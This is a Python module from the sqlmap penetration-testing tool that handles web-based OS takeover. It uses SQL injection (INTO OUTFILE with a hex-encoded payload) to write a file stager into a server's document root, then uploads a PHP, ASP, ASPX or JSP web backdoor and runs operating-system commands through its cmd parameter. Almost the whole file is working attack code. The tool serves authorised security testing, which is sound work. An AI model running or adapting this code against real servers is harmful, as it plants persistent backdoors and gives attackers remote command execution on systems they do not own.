#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import codecs
import os
import posixpath
import re

from extra.cloak.cloak import decloak
from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import decloakToNamedTemporaryFile
from lib.core.common import extractRegexResult
from lib.core.common import getDirs
from lib.core.common import getDocRoot
from lib.core.common import ntToPosixSlashes
from lib.core.common import isTechniqueAvailable
from lib.core.common import isWindowsDriveLetterPath
from lib.core.common import normalizePath
from lib.core.common import posixToNtSlashes
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import hexencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import OS
from lib.core.enums import PAYLOAD
from lib.request.connect import Connect as Request


class Web:
    """
    This class defines web-oriented OS takeover functionalities for
    plugins.
    """

    def __init__(self):
        self.webApi = None
        self.webBaseUrl = None
        self.webBackdoorUrl = None
        self.webStagerUrl = None
        self.webDirectory = None

    def webBackdoorRunCmd(self, cmd):
        if self.webBackdoorUrl is None:
            return

        output = None

        if not cmd:
            cmd = conf.osCmd

        cmdUrl = "%s?cmd=%s" % (self.webBackdoorUrl, cmd)
        page, _, _ = Request.getPage(url=cmdUrl, direct=True, silent=True)

        if page is not None:
            output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)

            if output:
                output = output.group(1)

        return output

    def webFileUpload(self, fileToUpload, destFileName, directory):
        inputFP = codecs.open(fileToUpload, "rb")
        retVal = self.__webFileStreamUpload(inputFP, destFileName, directory)
        inputFP.close()

        return retVal

    def __webFileStreamUpload(self, stream, destFileName, directory):
        stream.seek(0) # Rewind

        if self.webApi in ("php", "asp", "aspx", "jsp"):
            multipartParams = {
                                "upload":    "1",
                                "file":      stream,
                                "uploadDir": directory,
                              }

            if self.webApi == "aspx":
                multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
                multipartParams['__VIEWSTATE'] = kb.data.__VIEWSTATE

            page = Request.getPage(url=self.webStagerUrl, multipart=multipartParams, raise404=False)

            if "File uploaded" not in page:
                warnMsg = "unable to upload the backdoor through "
                warnMsg += "the file stager on '%s'" % directory
                logger.warn(warnMsg)
                return False
            else:
                return True

    def __webFileInject(self, fileContent, fileName, directory):
        outFile = posixpath.normpath("%s/%s" % (directory, fileName))
        uplQuery = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
        query = ""

        if isTechniqueAvailable(kb.technique):
            where = kb.injection.data[kb.technique].where

            if where == PAYLOAD.WHERE.NEGATIVE:
                randInt = randomInt()
                query += "OR %d=%d " % (randInt, randInt)

        query += "LIMIT 1 INTO OUTFILE '%s' " % outFile
        query += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
        query = agent.prefixQuery(query)
        query = agent.suffixQuery(query)
        payload = agent.payload(newValue=query)
        page = Request.queryPage(payload)
        return page

    def webInit(self):
        """
        This method is used to write a web backdoor (agent) on a writable
        remote directory within the web server document root.
        """

        if self.webBackdoorUrl is not None and self.webStagerUrl is not None and self.webApi is not None:
            return

        self.checkDbmsOs()

        infoMsg = "trying to upload the file stager"
        logger.info(infoMsg)

        default = None
        choices = ['asp', 'aspx', 'php', 'jsp']

        for ext in choices:
            if conf.url.endswith(ext):
                default = ext
                break

        if not default:
            if Backend.isOs(OS.WINDOWS):
                default = "asp"
            else:
                default = "php"

        message = "which web application language does the web server "
        message += "support?\n"

        for count in xrange(len(choices)):
            ext = choices[count]
            message += "[%d] %s%s\n" % (count + 1, ext.upper(), (" (default)" if default == ext else ""))

            if default == ext:
                default = count + 1

        message = message[:-1]

        while True:
            choice = readInput(message, default=str(default))

            if not choice.isdigit():
                logger.warn("invalid value, only digits are allowed")

            elif int(choice) < 1 or int(choice) > len(choices):
                logger.warn("invalid value, it must be between 1 and %d" % len(choices))

            else:
                self.webApi = choices[int(choice) - 1]
                break

        kb.docRoot = getDocRoot()
        directories = getDirs()
        directories = list(directories)
        directories.sort()

        backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
        backdoorStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi), backdoorName)
        originalBackdoorContent = backdoorContent = backdoorStream.read()

        stagerName = "tmpu%s.%s" % (randomStr(lowercase=True), self.webApi)
        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))

        warned = set()
        success = False

        for i in xrange(len(kb.docRoot)):
            if success:
                break

            for j in xrange(len(directories)):
                docRoot = kb.docRoot[i]
                directory = directories[j]
                uriPath = ""

                if not all(isinstance(item, basestring) for item in [docRoot, directory]):
                    continue

                directory = ntToPosixSlashes(normalizePath(directory)).replace("//", "/").rstrip('/')
                docRoot = ntToPosixSlashes(normalizePath(docRoot)).replace("//", "/").rstrip('/')

                # '' or '/' -> 'docRoot'
                if not directory:
                    localPath = docRoot
                    uriPath = '/'
                # 'dir1/dir2/dir3' -> 'docRoot/dir1/dir2/dir3'
                elif not isWindowsDriveLetterPath(directory) and directory[0] != '/':
                    localPath = "%s/%s" % (docRoot, directory)
                    uriPath = "/%s" % directory
                else:
                    localPath = directory
                    uriPath = directory[2:] if isWindowsDriveLetterPath(directory) else directory
                    docRoot = docRoot[2:] if isWindowsDriveLetterPath(docRoot) else docRoot
                    if docRoot in uriPath:
                        uriPath = uriPath.replace(docRoot, "/")
                        uriPath = "/%s" % normalizePath(uriPath)
                    else:
                        webDir = extractRegexResult(r"//[^/]+?/(?P<result>.*)/.", conf.url)
                        if webDir:
                            uriPath = "/%s" % webDir
                        else:
                            continue

                localPath = posixpath.normpath(localPath).rstrip('/')
                uriPath = posixpath.normpath(uriPath).rstrip('/')

                # Upload the file stager
                self.__webFileInject(stagerContent, stagerName, localPath)

                self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, uriPath)
                self.webStagerUrl = "%s/%s" % (self.webBaseUrl, stagerName)

                uplPage, _, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)

                uplPage = uplPage or ""

                if "sqlmap file uploader" not in uplPage:
                    if localPath not in warned:
                        warnMsg = "unable to upload the file stager "
                        warnMsg += "on '%s'" % localPath
                        logger.warn(warnMsg)
                        warned.add(localPath)
                    continue

                elif "<%" in uplPage or "<?" in uplPage:
                    warnMsg = "file stager uploaded "
                    warnMsg += "on '%s' but not dynamically interpreted" % localPath
                    logger.warn(warnMsg)
                    continue

                elif self.webApi == "aspx":
                    kb.data.__EVENTVALIDATION = extractRegexResult(r"__EVENTVALIDATION[^>]+value=\"(?P<result>[^\"]+)\"", uplPage, re.I)
                    kb.data.__VIEWSTATE = extractRegexResult(r"__VIEWSTATE[^>]+value=\"(?P<result>[^\"]+)\"", uplPage, re.I)

                infoMsg = "the file stager has been successfully uploaded "
                infoMsg += "on '%s' - %s" % (localPath, self.webStagerUrl)
                logger.info(infoMsg)

                if self.webApi == "asp":
                    runcmdName = "tmpe%s.exe" % randomStr(lowercase=True)
                    runcmdStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, 'runcmd.exe_'), runcmdName)
                    match = re.search(r'input type=hidden name=scriptsdir value="([^"]+)"', uplPage)

                    if match:
                        backdoorDirectory = match.group(1)
                    else:
                        continue

                    backdoorContent = originalBackdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", runcmdName)
                    backdoorStream.file.truncate()
                    backdoorStream.read()
                    backdoorStream.seek(0)
                    backdoorStream.write(backdoorContent)

                    if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
                        self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
                        self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                        self.webDirectory = backdoorDirectory
                    else:
                        continue

                else:
                    if not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(localPath) if Backend.isOs(OS.WINDOWS) else localPath):
                        warnMsg = "backdoor has not been successfully uploaded "
                        warnMsg += "through the file stager possibly because "
                        warnMsg += "the user running the web server process "
                        warnMsg += "has not write privileges over the folder "
                        warnMsg += "where the user running the DBMS process "
                        warnMsg += "was able to upload the file stager or "
                        warnMsg += "because the DBMS and web server sit on "
                        warnMsg += "different servers"
                        logger.warn(warnMsg)

                        message = "do you want to try the same method used "
                        message += "for the file stager? [Y/n] "
                        getOutput = readInput(message, default="Y")

                        if getOutput in ("y", "Y"):
                            self.__webFileInject(backdoorContent, backdoorName, localPath)
                        else:
                            continue

                    self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
                    self.webDirectory = localPath

                infoMsg = "the backdoor has probably been successfully "
                infoMsg += "uploaded on '%s' - " % self.webDirectory
                infoMsg += self.webBackdoorUrl
                logger.info(infoMsg)

                success = True

                break
